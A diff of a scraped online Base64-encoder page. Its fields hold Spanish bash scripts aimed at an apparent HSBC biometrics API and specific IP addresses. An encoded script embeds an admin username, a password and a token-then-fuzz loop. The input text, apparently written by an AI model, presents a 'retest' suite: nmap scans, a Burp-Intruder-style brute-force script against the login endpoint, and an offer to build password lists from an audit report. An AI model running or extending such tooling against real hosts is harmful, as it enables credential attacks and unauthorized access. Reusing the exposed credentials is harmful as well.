@@ -1,4 +1,213 @@
-example 39
+example 40
 
+Logo
+Online Tools
+Dark mode
+Hash
+CRC
+MD
+SHA1
+SHA2
+SHA2-512
+SHA3
+Keccak
+SHAKE
+cSHAKE
+KMAC
+RIPEMD
+BLAKE
+Cryptography
+AES
+DES
+Triple DES
+RC4
+ECDSA
+RSA
+Encoding
+Hex (Base16)
+Base32
+Base58
+Base64
+Encode
+Decode
+File to Base64
+Base64 to File
+HTML
+URL
+Format
+JSON
+XML
+Convert
+Case
+Others
+Others
+Links
+Contact
+Base64 Encode
+This online Base64 encoding tool helps you encode text or binary to Base64. You can input UTF-8, UTF-16, Hex, or other encodings. It also supports various formats such as RFC 4648 (standard and URL Safe), RFC 2045 (MIME), RFC 2152 (UTF-7), and RFC 3501 (IMAP).
 
-IyEvYmluL2Jhc2gKCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgMS4gQ29uZmlndXJhY2nDs24gZGUgbGEgQVBJIHkgQXV0ZW50aWNhY2nDs24KIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KQVBJX1VSTD0iaHR0cHM6Ly9iaW9tZXRyaWNzLWZwYy1hcGkub2F0Lm14LmhzYmMiClVTRVI9ImRzZnBjYWRtaW4iClBBU1M9IjAzcTVqTHRObnk1SU0rWUozOGdFVkUzU3FHb3dIb1ZBV1JyZTM1d3dnY0YrcXd3PSIKSVBfQ0xJRU5URT0iMTY0LjYuMzMuMjUzIgpXT1JETElTVD0id29yZGxpc3QudHh0IgoKIyBWYWxpZGFyIHF1ZSBleGlzdGUganEKaWYgISBjb21tYW5kIC12IGpxICY+IC9kZXYvbnVsbDsgdGhlbgogICAgZWNobyAi4p2MIEVycm9yOiAnanEnIG5vIGVzdMOhIGluc3RhbGFkby4gUG9yIGZhdm9yIGluc3TDoWxhbG8gcGFyYSBwcm9jZXNhciBlbCBKU09OLiIKICAgIGV4aXQgMQpmaQoKIyBWYWxpZGFyIHF1ZSBlbCB3b3JkbGlzdCBleGlzdGUKaWYgWyAhIC1mICIkV09SRExJU1QiIF07IHRoZW4KICAgIGVjaG8gIuKdjCBFcnJvcjogTm8gc2UgZW5jb250csOzIGVsIGFyY2hpdm8gJyRXT1JETElTVCcuIgogICAgZXhpdCAxCmZpCgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIDIuIFRlbXBsYXRlIGRlbCBQYXlsb2FkCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ClRFTVBMQVRFPSd7CiAgImhvc3QiOiB7ImlwIjoiMTI3LjAuMC4xIiwic3VjdXJzYWwiOiJGUENBUFAifSwKICAidHJhbnNhY2Npb24iOiB7CiAgICAiaWQiOiI4NDI2ZjgzMi0zN2IwLTczNGEtZDhlMC1hN2Y4ZjVjZGIxNDAiLAogICAgImZlY2hhSG9yYSI6MTc3MTI3NjA2NDk3NiwKICAgICJzaXN0ZW1hT3JpZ2VuIjoiRlBDIiwKICAgICJ0aXBvIjoiTUVNQkVSIiwKICAgICJpZE9wZXJhZG9yIjoiNDUxNTc0NjYiLAogICAgImNvZGlnb1Jlc3B1ZXN0YSI6bnVsbAogIH0sCiAgInBhcmFtZXRyb3MiOiB7CiAgICAiY2xhdmUiOiI1MDE2MjkiLAogICAgIm5vbWJyZSI6IsKnRlVaWsKnIiwKICAgICJkZXNjcmlwY2lvbiI6IkFkbWluaXN0cmFkb3IgZGUgU3VjdXJzYWwiLAogICAgImFjdGl2byI6dHJ1ZQogIH0KfScKCmVjaG8gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKZWNobyAi4pa2IFBhc28gMTogT2J0ZW5pZW5kbyBUb2tlbiBCZWFyZXIuLi4iCmVjaG8gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKCiMgSGFjZW1vcyBsYSBwZXRpY2nDs24gZ3VhcmRhbmRvIGVsIGPDs2RpZ28gSFRUUCB5IHVzYW5kbyB0aW1lb3V0cyAoLS1jb25uZWN0LXRpbWVvdXQgeSAtbSkKIyBBw7FhZGltb3MgT3JpZ2luIHkgUmVmZXJlciBiYXPDoW5kb25vcyBlbiB0dSBwZXRpY2nDs24gb3JpZ2luYWwKTE9HSU5fUEFZTE9BRD0ie1widXNlcm5hbWVcIjpcIiRVU0VSXCIsXCJwYXNzd29yZFwiOlwiJFBBU1NcIixcImlwQ2xpZW50ZVwiOlwiJElQX0NMSUVOVEVcIn0iCgpMT0dJTl9SRVNQT05TRT0kKGN1cmwgLXMgLXcgIlxuSFRUUF9DT0RFOiV7aHR0cF9jb2RlfSIgLVggUE9TVCAiJEFQSV9VUkwvZnBjLWFwaS9hdXRoL3Rva2VuIiBcCiAgLS1jb25uZWN0LXRpbWVvdXQgMTAgLW0gMzAgXAogIC1IICJBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIgXAogIC1IICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD1VVEYtOCIgXAogIC1IICJPcmlnaW46IGh0dHBzOi8vYmlvbWV0cmljcy1mcGMub2F0Lm14LmhzYmMiIFwKICAtSCAiUmVmZXJlcjogaHR0cHM6Ly9iaW9tZXRyaWNzLWZwYy5vYXQubXguaHNiYy8iIFwKICAtSCAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0My4wLjAuMCBTYWZhcmkvNTM3LjM2IiBcCiAgLWQgIiRMT0dJTl9QQVlMT0FEIikKCiMgU2VwYXJhciBlbCBjdWVycG8gZGUgbGEgcmVzcHVlc3RhIGRlbCBjw7NkaWdvIEhUVFAKTE9HSU5fQk9EWT0kKGVjaG8gIiRMT0dJTl9SRVNQT05TRSIgfCBzZWQgLWUgJyRkJykKTE9HSU5fSFRUUF9DT0RFPSQoZWNobyAiJExPR0lOX1JFU1BPTlNFIiB8IHRhaWwgLW4xIHwgY3V0IC1kJzonIC1mMikKCiMgVmVyaWZpY2FyIHNpIGZhbGzDsyBsYSBjb25leGnDs24gbyBlbCBIVFRQIG5vIGVzIDIwMAppZiBbICIkTE9HSU5fSFRUUF9DT0RFIiAhPSAiMjAwIiBdOyB0aGVuCiAgICBlY2hvICLinYwgRXJyb3IgY3LDrXRpY28gYWwgaW5pY2lhciBzZXNpw7NuLiIKICAgIGVjaG8gIiAgIEPDs2RpZ28gSFRUUCBkZXZ1ZWx0bzogJExPR0lOX0hUVFBfQ09ERSIKICAgIGVjaG8gIiAgIFJlc3B1ZXN0YSBkZWwgc2Vydmlkb3I6ICRMT0dJTl9CT0RZIgogICAgZXhpdCAxCmZpCgojIEV4dHJhZXIgZWwgdG9rZW4gZGUgZm9ybWEgc2VndXJhLCBxdWl0YW5kbyBwb3NpYmxlcyBzYWx0b3MgZGUgbMOtbmVhIChccikKVE9LRU49JChlY2hvICIkTE9HSU5fQk9EWSIgfCBqcSAtciAnLnRva2VuJyAyPi9kZXYvbnVsbCB8IHRyIC1kICdccicgfCB0ciAtZCAnXG4nKQoKIyBWYWxpZGFyIHF1ZSBlbCB0b2tlbiBleGlzdGEgeSBubyBlc3TDqSB2YWPDrW8KaWYgWyAiJFRPS0VOIiA9PSAibnVsbCIgXSB8fCBbIC16ICIkVE9LRU4iIF07IHRoZW4KICAgIGVjaG8gIuKdjCBFcnJvcjogTGEgcGV0aWNpw7NuIGZ1ZSBleGl0b3NhICgyMDAgT0spIHBlcm8gbm8gc2UgZW5jb250csOzIGVsICd0b2tlbicgZW4gZWwgSlNPTi4iCiAgICBlY2hvICIgICBDdWVycG8gZGUgbGEgcmVzcHVlc3RhOiIKICAgIGVjaG8gIiRMT0dJTl9CT0RZIgogICAgZXhpdCAxCmZpCgplY2hvICLinIUgVG9rZW4gZXh0cmHDrWRvIGNvcnJlY3RhbWVudGUuIgplY2hvICIiCgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIOKWtiBQYXNvIDI6IEVqZWN1dGFyIGVsICJJbnRydWRlciIKIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KZWNobyAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgplY2hvICLilrYgUGFzbyAyOiBJbmljaWFuZG8gYXRhcXVlIC8gRnV6emluZy4uLiIKZWNobyAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgoKQ09OVEFET1I9MQoKd2hpbGUgSUZTPSByZWFkIC1yIGZ1enplZF92YWx1ZTsgZG8KICAgIAogICAgIyBJZ25vcmFyIGzDrW5lYXMgdmFjw61hcyB5IHNhbHRvcyBkZSBsw61uZWEgZXh0cmHDsW9zCiAgICBmdXp6ZWRfdmFsdWU9JChlY2hvICIkZnV6emVkX3ZhbHVlIiB8IHRyIC1kICdccicgfCB0ciAtZCAnXG4nKQogICAgW1sgLXogIiRmdXp6ZWRfdmFsdWUiIF1dICYmIGNvbnRpbnVlCgogICAgZWNobyAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCiAgICBlY2hvICLwn5SlIFBldGljacOzbiAjJENPTlRBRE9SIHwgSW55ZWN0YW5kbzogJyRmdXp6ZWRfdmFsdWUnIgoKICAgIFBBWUxPQUQ9IiR7VEVNUExBVEUvL8KnRlVaWsKnLyRmdXp6ZWRfdmFsdWV9IgoKICAgICMgRGlzcGFyYW1vcyBsYSBwZXRpY2nDs24gY29uIHRpbWVvdXRzIHkgY2FiZWNlcmFzIGV4YWN0YXMKICAgIFJFU1BPTlNFPSQoY3VybCAtcyAtdyAiXG5IVFRQX0NPREU6JXtodHRwX2NvZGV9IiAtWCBQVVQgIiRBUElfVVJML2ZwYy1hcGkvbWVtYmVyL3Bvc2l0aW9uLzUwMTYyOSIgXAogICAgICAgIC0tY29ubmVjdC10aW1lb3V0IDEwIC1tIDMwIFwKICAgICAgICAtSCAiQXV0aG9yaXphdGlvbjogJFRPS0VOIiBcCiAgICAgICAgLUggIkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qIiBcCiAgICAgICAgLUggIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04IiBcCiAgICAgICAgLUggIk9yaWdpbjogaHR0cHM6Ly9iaW9tZXRyaWNzLWZwYy5vYXQubXguaHNiYyIgXAogICAgICAgIC1IICJSZWZlcmVyOiBodHRwczovL2Jpb21ldHJpY3MtZnBjLm9hdC5teC5oc2JjLyIgXAogICAgICAgIC1IICJVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYiIFwKICAgICAgICAtZCAiJFBBWUxPQUQiKQoKICAgIEhUVFBfQk9EWT0kKGVjaG8gIiRSRVNQT05TRSIgfCBzZWQgLWUgJyRkJykKICAgIEhUVFBfQ09ERT0kKGVjaG8gIiRSRVNQT05TRSIgfCB0YWlsIC1uMSB8IGN1dCAtZCc6JyAtZjIpCgogICAgZWNobyAiICAgQ8OzZGlnbyBIVFRQOiAkSFRUUF9DT0RFIgogICAgZWNobyAiICAgUmVzcHVlc3RhOiAkSFRUUF9CT0RZIgogICAgCiAgICAoKENPTlRBRE9SKyspKQoKZG9uZSA8ICIkV09SRExJU1QiCgplY2hvICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIKZWNobyAi4pyFIEZ1enppbmcgZmluYWxpemFkby4i
+Input
+Full Screen
+Para automatizar el **retest** y las pruebas de seguridad interna en **HSBC**, he diseñado esta suite de scripts en **Bash**. Cada uno está alineado con los hallazgos técnicos del reporte de **KPMG**.
+
+---
+
+### 1. Auditoría de Hardening SSH (`ssh_audit.sh`)
+
+Valida el cumplimiento de algoritmos de cifrado y métodos de autenticación.
+
+```bash
+#!/bin/bash
+# ssh_audit.sh - Verifica vulnerabilidades de SSH reportadas
+TARGET=$1
+OUTPUT="ssh_report_${TARGET}.txt"
+
+echo "--- SSH AUDIT FOR $TARGET ---" | tee "$OUTPUT"
+# Verificación de métodos de autenticación (Hallazgo 2 Infra)
+echo "[*] Checking Auth Methods..." | tee -a "$OUTPUT"
+nmap -p 22 --script ssh-auth-methods "$TARGET" | tee -a "$OUTPUT"
+
+# Verificación de Algoritmos y Cifrados (Hallazgos 3, 4 y 5 Infra)
+echo "[*] Checking Algorithms (KEX, Ciphers, MACs)..." | tee -a "$OUTPUT"
+nmap -p 22 --script ssh2-enum-algos "$TARGET" | tee -a "$OUTPUT"
+
+echo "Report saved to: $OUTPUT"
+
+```
+
+---
+
+### 2. Escaneo de Versiones y Servicios (`version_checker.sh`)
+
+Busca versiones obsoletas de **OpenSSH 7.4** y **Splunkd 8.1.2**.
+
+```bash
+#!/bin/bash
+# version_checker.sh - Detecta versiones vulnerables
+TARGETS=("164.6.33.138" "164.6.33.183")
+OUTPUT="version_audit.log"
+
+for IP in "${TARGETS[@]}"; do
+    echo "--- SCANNING $IP ---" | tee -a "$OUTPUT"
+    # Escaneo de versiones en puertos reportados (22 y 8689)
+    nmap -sV -p 22,8689 "$IP" --open | tee -a "$OUTPUT"
+done
+
+```
+
+---
+
+### 3. Auditoría de API y Cabeceras (`web_sec_check.sh`)
+
+Verifica la exposición de datos en el endpoint `/token` y la falta de flags en cookies.
+
+```bash
+#!/bin/bash
+# web_sec_check.sh - Verifica Sensitive Data y Security Headers
+URL="https://biometrics-fps.oat.mx.hsbc/fpc-api"
+LOG="web_security.txt"
+
+echo "--- WEB SECURITY AUDIT ---" | tee "$LOG"
+# Verificación de datos sensibles en respuesta (Hallazgo 1 Web)
+echo "[*] Testing API Sensitive Data Exposure..." | tee -a "$LOG"
+curl -s -X POST "$URL/auth/token" -H "Content-Type: application/json" | jq '.' | tee -a "$LOG"
+
+# Verificación de Headers y Cookies (Hallazgo 4 y 5 Web)
+echo -e "\n[*] Checking Security Headers & Cookie Flags..." | tee -a "$LOG"
+curl -I -s "https://biometrics-fps.oat.mx.hsbc/fpc/login" | grep -E "Set-Cookie|Content-Security-Policy" | tee -a "$LOG"
+
+```
+
+---
+
+### 4. Bash "Intruder" Script (`bash_intruder.sh`)
+
+Este script emula los 4 tipos de ataque de **Burp Suite Intruder** para pruebas internas de fuerza bruta o inyección de parámetros.
+
+```bash
+#!/bin/bash
+# bash_intruder.sh - Replicación de funciones de Burp Intruder
+
+MODE=$1 # sniper, battering_ram, pitchfork, cluster_bomb
+TARGET_URL="https://biometrics-fps.oat.mx.hsbc/fpc-api/auth/token"
+LIST1="users.txt"
+LIST2="passwords.txt"
+
+case $MODE in
+  "sniper")
+    # Un solo payload, una posición a la vez
+    echo "[!] Mode: Sniper"
+    for payload in $(cat $LIST1); do
+        echo "[+] Testing: $payload"
+        curl -s -X POST "$TARGET_URL" -d "{\"user\":\"$payload\",\"pass\":\"constante\"}"
+    done
+    ;;
+
+  "battering_ram")
+    # Un solo payload puesto en todas las posiciones simultáneamente
+    echo "[!] Mode: Battering Ram"
+    for payload in $(cat $LIST1); do
+        echo "[+] Testing: $payload / $payload"
+        curl -s -X POST "$TARGET_URL" -d "{\"user\":\"$payload\",\"pass\":\"$payload\"}"
+    done
+    ;;
+
+  "pitchfork")
+    # Múltiples listas en paralelo (Línea 1 con Línea 1)
+    echo "[!] Mode: Pitchfork"
+    exec 3<$LIST1
+    exec 4<$LIST2
+    while read -u 3 p1 && read -u 4 p2; do
+        echo "[+] Sync: $p1:$p2"
+        curl -s -X POST "$TARGET_URL" -d "{\"user\":\"$p1\",\"pass\":\"$p2\"}"
+    done
+    ;;
+
+  "cluster_bomb")
+    # Producto cartesiano (Todas las combinaciones posibles)
+    echo "[!] Mode: Cluster Bomb"
+    for p1 in $(cat $LIST1); do
+        for p2 in $(cat $LIST2); do
+            echo "[+] Combo: $p1:$p2"
+            curl -s -X POST "$TARGET_URL" -d "{\"user\":\"$p1\",\"pass\":\"$p2\"}"
+        done
+    done
+    ;;
+
+  *)
+    echo "Usage: ./bash_intruder.sh [sniper|battering_ram|pitchfork|cluster_bomb]"
+    ;;
+esac
+
+```
+
+---
+
+### 📋 Resumen de Archivos de Salida
+
+| Script | Salida en Pantalla | Archivo de Salida |
+| --- | --- | --- |
+| `ssh_audit.sh` | Logs de Nmap detallados | `ssh_report_[IP].txt` |
+| `version_checker.sh` | Versiones de servicios | `version_audit.log` |
+| `web_sec_check.sh` | JSON de API y Headers | `web_security.txt` |
+| `bash_intruder.sh` | Status de cada petición | Salida estándar (redirigible a log) |
+
+**Siguiente paso recomendado:**
+¿Te gustaría que cree los **archivos de payloads** (`users.txt` y `passwords.txt`) con los nombres de usuario y patrones de contraseñas (como `Metris05`) que KPMG identificó en su reporte?.
+Output
+SwapCopy
+Full Screen
+UGFyYSBhdXRvbWF0aXphciBlbCAqKnJldGVzdCoqIHkgbGFzIHBydWViYXMgZGUgc2VndXJpZGFkIGludGVybmEgZW4gKipIU0JDKiosIGhlIGRpc2XDsWFkbyBlc3RhIHN1aXRlIGRlIHNjcmlwdHMgZW4gKipCYXNoKiouIENhZGEgdW5vIGVzdMOhIGFsaW5lYWRvIGNvbiBsb3MgaGFsbGF6Z29zIHTDqWNuaWNvcyBkZWwgcmVwb3J0ZSBkZSAqKktQTUcqKi4KCi0tLQoKIyMjIDEuIEF1ZGl0b3LDrWEgZGUgSGFyZGVuaW5nIFNTSCAoYHNzaF9hdWRpdC5zaGApCgpWYWxpZGEgZWwgY3VtcGxpbWllbnRvIGRlIGFsZ29yaXRtb3MgZGUgY2lmcmFkbyB5IG3DqXRvZG9zIGRlIGF1dGVudGljYWNpw7NuLgoKYGBgYmFzaAojIS9iaW4vYmFzaAojIHNzaF9hdWRpdC5zaCAtIFZlcmlmaWNhIHZ1bG5lcmFiaWxpZGFkZXMgZGUgU1NIIHJlcG9ydGFkYXMKVEFSR0VUPSQxCk9VVFBVVD0ic3NoX3JlcG9ydF8ke1RBUkdFVH0udHh0IgoKZWNobyAiLS0tIFNTSCBBVURJVCBGT1IgJFRBUkdFVCAtLS0iIHwgdGVlICIkT1VUUFVUIgojIFZlcmlmaWNhY2nDs24gZGUgbcOpdG9kb3MgZGUgYXV0ZW50aWNhY2nDs24gKEhhbGxhemdvIDIgSW5mcmEpCmVjaG8gIlsqXSBDaGVja2luZyBBdXRoIE1ldGhvZHMuLi4iIHwgdGVlIC1hICIkT1VUUFVUIgpubWFwIC1wIDIyIC0tc2NyaXB0IHNzaC1hdXRoLW1ldGhvZHMgIiRUQVJHRVQiIHwgdGVlIC1hICIkT1VUUFVUIgoKIyBWZXJpZmljYWNpw7NuIGRlIEFsZ29yaXRtb3MgeSBDaWZyYWRvcyAoSGFsbGF6Z29zIDMsIDQgeSA1IEluZnJhKQplY2hvICJbKl0gQ2hlY2tpbmcgQWxnb3JpdGhtcyAoS0VYLCBDaXBoZXJzLCBNQUNzKS4uLiIgfCB0ZWUgLWEgIiRPVVRQVVQiCm5tYXAgLXAgMjIgLS1zY3JpcHQgc3NoMi1lbnVtLWFsZ29zICIkVEFSR0VUIiB8IHRlZSAtYSAiJE9VVFBVVCIKCmVjaG8gIlJlcG9ydCBzYXZlZCB0bzogJE9VVFBVVCIKCmBgYAoKLS0tCgojIyMgMi4gRXNjYW5lbyBkZSBWZXJzaW9uZXMgeSBTZXJ2aWNpb3MgKGB2ZXJzaW9uX2NoZWNrZXIuc2hgKQoKQnVzY2EgdmVyc2lvbmVzIG9ic29sZXRhcyBkZSAqKk9wZW5TU0ggNy40KiogeSAqKlNwbHVua2QgOC4xLjIqKi4KCmBgYGJhc2gKIyEvYmluL2Jhc2gKIyB2ZXJzaW9uX2NoZWNrZXIuc2ggLSBEZXRlY3RhIHZlcnNpb25lcyB2dWxuZXJhYmxlcwpUQVJHRVRTPSgiMTY0LjYuMzMuMTM4IiAiMTY0LjYuMzMuMTgzIikKT1VUUFVUPSJ2ZXJzaW9uX2F1ZGl0LmxvZyIKCmZvciBJUCBpbiAiJHtUQVJHRVRTW0BdfSI7IGRvCiAgICBlY2hvICItLS0gU0NBTk5JTkcgJElQIC0tLSIgfCB0ZWUgLWEgIiRPVVRQVVQiCiAgICAjIEVzY2FuZW8gZGUgdmVyc2lvbmVzIGVuIHB1ZXJ0b3MgcmVwb3J0YWRvcyAoMjIgeSA4Njg5KQogICAgbm1hcCAtc1YgLXAgMjIsODY4OSAiJElQIiAtLW9wZW4gfCB0ZWUgLWEgIiRPVVRQVVQiCmRvbmUKCmBgYAoKLS0tCgojIyMgMy4gQXVkaXRvcsOtYSBkZSBBUEkgeSBDYWJlY2VyYXMgKGB3ZWJfc2VjX2NoZWNrLnNoYCkKClZlcmlmaWNhIGxhIGV4cG9zaWNpw7NuIGRlIGRhdG9zIGVuIGVsIGVuZHBvaW50IGAvdG9rZW5gIHkgbGEgZmFsdGEgZGUgZmxhZ3MgZW4gY29va2llcy4KCmBgYGJhc2gKIyEvYmluL2Jhc2gKIyB3ZWJfc2VjX2NoZWNrLnNoIC0gVmVyaWZpY2EgU2Vuc2l0aXZlIERhdGEgeSBTZWN1cml0eSBIZWFkZXJzClVSTD0iaHR0cHM6Ly9iaW9tZXRyaWNzLWZwcy5vYXQubXguaHNiYy9mcGMtYXBpIgpMT0c9IndlYl9zZWN1cml0eS50eHQiCgplY2hvICItLS0gV0VCIFNFQ1VSSVRZIEFVRElUIC0tLSIgfCB0ZWUgIiRMT0ciCiMgVmVyaWZpY2FjacOzbiBkZSBkYXRvcyBzZW5zaWJsZXMgZW4gcmVzcHVlc3RhIChIYWxsYXpnbyAxIFdlYikKZWNobyAiWypdIFRlc3RpbmcgQVBJIFNlbnNpdGl2ZSBEYXRhIEV4cG9zdXJlLi4uIiB8IHRlZSAtYSAiJExPRyIKY3VybCAtcyAtWCBQT1NUICIkVVJML2F1dGgvdG9rZW4iIC1IICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIHwganEgJy4nIHwgdGVlIC1hICIkTE9HIgoKIyBWZXJpZmljYWNpw7NuIGRlIEhlYWRlcnMgeSBDb29raWVzIChIYWxsYXpnbyA0IHkgNSBXZWIpCmVjaG8gLWUgIlxuWypdIENoZWNraW5nIFNlY3VyaXR5IEhlYWRlcnMgJiBDb29raWUgRmxhZ3MuLi4iIHwgdGVlIC1hICIkTE9HIgpjdXJsIC1JIC1zICJodHRwczovL2Jpb21ldHJpY3MtZnBzLm9hdC5teC5oc2JjL2ZwYy9sb2dpbiIgfCBncmVwIC1FICJTZXQtQ29va2llfENvbnRlbnQtU2VjdXJpdHktUG9saWN5IiB8IHRlZSAtYSAiJExPRyIKCmBgYAoKLS0tCgojIyMgNC4gQmFzaCAiSW50cnVkZXIiIFNjcmlwdCAoYGJhc2hfaW50cnVkZXIuc2hgKQoKRXN0ZSBzY3JpcHQgZW11bGEgbG9zIDQgdGlwb3MgZGUgYXRhcXVlIGRlICoqQnVycCBTdWl0ZSBJbnRydWRlcioqIHBhcmEgcHJ1ZWJhcyBpbnRlcm5hcyBkZSBmdWVyemEgYnJ1dGEgbyBpbnllY2Npw7NuIGRlIHBhcsOhbWV0cm9zLgoKYGBgYmFzaAojIS9iaW4vYmFzaAojIGJhc2hfaW50cnVkZXIuc2ggLSBSZXBsaWNhY2nDs24gZGUgZnVuY2lvbmVzIGRlIEJ1cnAgSW50cnVkZXIKCk1PREU9JDEgIyBzbmlwZXIsIGJhdHRlcmluZ19yYW0sIHBpdGNoZm9yaywgY2x1c3Rlcl9ib21iClRBUkdFVF9VUkw9Imh0dHBzOi8vYmlvbWV0cmljcy1mcHMub2F0Lm14LmhzYmMvZnBjLWFwaS9hdXRoL3Rva2VuIgpMSVNUMT0idXNlcnMudHh0IgpMSVNUMj0icGFzc3dvcmRzLnR4dCIKCmNhc2UgJE1PREUgaW4KICAic25pcGVyIikKICAgICMgVW4gc29sbyBwYXlsb2FkLCB1bmEgcG9zaWNpw7NuIGEgbGEgdmV6CiAgICBlY2hvICJbIV0gTW9kZTogU25pcGVyIgogICAgZm9yIHBheWxvYWQgaW4gJChjYXQgJExJU1QxKTsgZG8KICAgICAgICBlY2hvICJbK10gVGVzdGluZzogJHBheWxvYWQiCiAgICAgICAgY3VybCAtcyAtWCBQT1NUICIkVEFSR0VUX1VSTCIgLWQgIntcInVzZXJcIjpcIiRwYXlsb2FkXCIsXCJwYXNzXCI6XCJjb25zdGFudGVcIn0iCiAgICBkb25lCiAgICA7OwoKICAiYmF0dGVyaW5nX3JhbSIpCiAgICAjIFVuIHNvbG8gcGF5bG9hZCBwdWVzdG8gZW4gdG9kYXMgbGFzIHBvc2ljaW9uZXMgc2ltdWx0w6FuZWFtZW50ZQogICAgZWNobyAiWyFdIE1vZGU6IEJhdHRlcmluZyBSYW0iCiAgICBmb3IgcGF5bG9hZCBpbiAkKGNhdCAkTElTVDEpOyBkbwogICAgICAgIGVjaG8gIlsrXSBUZXN0aW5nOiAkcGF5bG9hZCAvICRwYXlsb2FkIgogICAgICAgIGN1cmwgLXMgLVggUE9TVCAiJFRBUkdFVF9VUkwiIC1kICJ7XCJ1c2VyXCI6XCIkcGF5bG9hZFwiLFwicGFzc1wiOlwiJHBheWxvYWRcIn0iCiAgICBkb25lCiAgICA7OwoKICAicGl0Y2hmb3JrIikKICAgICMgTcO6bHRpcGxlcyBsaXN0YXMgZW4gcGFyYWxlbG8gKEzDrW5lYSAxIGNvbiBMw61uZWEgMSkKICAgIGVjaG8gIlshXSBNb2RlOiBQaXRjaGZvcmsiCiAgICBleGVjIDM8JExJU1QxCiAgICBleGVjIDQ8JExJU1QyCiAgICB3aGlsZSByZWFkIC11IDMgcDEgJiYgcmVhZCAtdSA0IHAyOyBkbwogICAgICAgIGVjaG8gIlsrXSBTeW5jOiAkcDE6JHAyIgogICAgICAgIGN1cmwgLXMgLVggUE9TVCAiJFRBUkdFVF9VUkwiIC1kICJ7XCJ1c2VyXCI6XCIkcDFcIixcInBhc3NcIjpcIiRwMlwifSIKICAgIGRvbmUKICAgIDs7CgogICJjbHVzdGVyX2JvbWIiKQogICAgIyBQcm9kdWN0byBjYXJ0ZXNpYW5vIChUb2RhcyBsYXMgY29tYmluYWNpb25lcyBwb3NpYmxlcykKICAgIGVjaG8gIlshXSBNb2RlOiBDbHVzdGVyIEJvbWIiCiAgICBmb3IgcDEgaW4gJChjYXQgJExJU1QxKTsgZG8KICAgICAgICBmb3IgcDIgaW4gJChjYXQgJExJU1QyKTsgZG8KICAgICAgICAgICAgZWNobyAiWytdIENvbWJvOiAkcDE6JHAyIgogICAgICAgICAgICBjdXJsIC1zIC1YIFBPU1QgIiRUQVJHRVRfVVJMIiAtZCAie1widXNlclwiOlwiJHAxXCIsXCJwYXNzXCI6XCIkcDJcIn0iCiAgICAgICAgZG9uZQogICAgZG9uZQogICAgOzsKCiAgKikKICAgIGVjaG8gIlVzYWdlOiAuL2Jhc2hfaW50cnVkZXIuc2ggW3NuaXBlcnxiYXR0ZXJpbmdfcmFtfHBpdGNoZm9ya3xjbHVzdGVyX2JvbWJdIgogICAgOzsKZXNhYwoKYGBgCgotLS0KCiMjIyDwn5OLIFJlc3VtZW4gZGUgQXJjaGl2b3MgZGUgU2FsaWRhCgp8IFNjcmlwdCB8IFNhbGlkYSBlbiBQYW50YWxsYSB8IEFyY2hpdm8gZGUgU2FsaWRhIHwKfCAtLS0gfCAtLS0gfCAtLS0gfAp8IGBzc2hfYXVkaXQuc2hgIHwgTG9ncyBkZSBObWFwIGRldGFsbGFkb3MgfCBgc3NoX3JlcG9ydF9bSVBdLnR4dGAgfAp8IGB2ZXJzaW9uX2NoZWNrZXIuc2hgIHwgVmVyc2lvbmVzIGRlIHNlcnZpY2lvcyB8IGB2ZXJzaW9uX2F1ZGl0LmxvZ2AgfAp8IGB3ZWJfc2VjX2NoZWNrLnNoYCB8IEpTT04gZGUgQVBJIHkgSGVhZGVycyB8IGB3ZWJfc2VjdXJpdHkudHh0YCB8CnwgYGJhc2hfaW50cnVkZXIuc2hgIHwgU3RhdHVzIGRlIGNhZGEgcGV0aWNpw7NuIHwgU2FsaWRhIGVzdMOhbmRhciAocmVkaXJpZ2libGUgYSBsb2cpIHwKCioqU2lndWllbnRlIHBhc28gcmVjb21lbmRhZG86KioKwr9UZSBndXN0YXLDrWEgcXVlIGNyZWUgbG9zICoqYXJjaGl2b3MgZGUgcGF5bG9hZHMqKiAoYHVzZXJzLnR4dGAgeSBgcGFzc3dvcmRzLnR4dGApIGNvbiBsb3Mgbm9tYnJlcyBkZSB1c3VhcmlvIHkgcGF0cm9uZXMgZGUgY29udHJhc2XDsWFzIChjb21vIGBNZXRyaXMwNWApIHF1ZSBLUE1HIGlkZW50aWZpY8OzIGVuIHN1IHJlcG9ydGU/Lg==
+Share Link
+Copy
+Settings
+Encode
+Auto Update
+Remember Input
+Input Encoding
+
+UTF-8
+Format
+
+RFC 4648
